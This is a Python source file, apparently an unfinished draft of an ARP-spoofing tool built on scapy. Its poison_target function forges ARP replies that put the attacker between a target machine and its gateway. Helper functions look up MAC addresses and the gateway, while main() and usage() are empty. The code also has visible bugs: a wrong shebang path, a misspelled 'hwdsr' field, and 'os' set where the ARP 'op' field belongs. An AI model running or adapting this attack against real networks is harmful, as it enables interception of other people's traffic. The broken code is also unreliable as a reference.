#!/usr/env/python3

from scapy.all import *
import os
import sys
import threading
import signal
import getopt
import re
import time


DEFAULT_PACKETS_PER_MINUTE = 6
DEFAULT_RECIEVED_PACKETS = 1000
DEFAULT_SPLIT_ON = 1000


def usage():
	pass


def main():
	pass


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
	target = ARP()
	target.op = 2
	target.psrc = gateway_ip
	target.pdst = target_ip
	target.hwdst = target_mac

	gateway = ARP()
	gateway.op = 2
	gateway.psrc = target_ip
	gateway.pdst = gateway_ip
	gateway.hwdsr = gateway_mac

	print("[+] Sending posioned packets")

	send(target)
	send(gateway)


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
	target = ARP()
	target.os = 2
	target.psrc = gateway_ip
	target.pdst = target_ip
	target.hwdst = "ff:ff:ff:ff:ff:ff"
	target.hwsrc = gateway_mac

	gateway = ARP()
	gateway.os = 2
	gateway.psrc = target_ip
	gateway.pdst = gateway_ip
	gateway.hwdst = "ff:ff:ff:ff:ff:ff"
	gateway.hwsrc = target_mac

	print("[+] Restoring target")

	send(target)
	send(gateway)


def get_mac(ip_address):
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)

    for s,r in responses:
        return r[Ether].src

    return None


def get_gateway_ip():
    try:
        print("[+] Looking for gateway ip")
        gateway = sr1(IP(dst="www.google.com", ttl=0) / ICMP() / "XXXXXXXXXXX", verbose=False)
        print("[+] Found gateway ip at {}".format(gateway.src))
        return gateway.src
    except:
        print("[-] Could not get gateway IP, please enter IP manually")
        return input("<APRintercept:#> Gateway IP: ")


if __name__ == '__main__':
    main()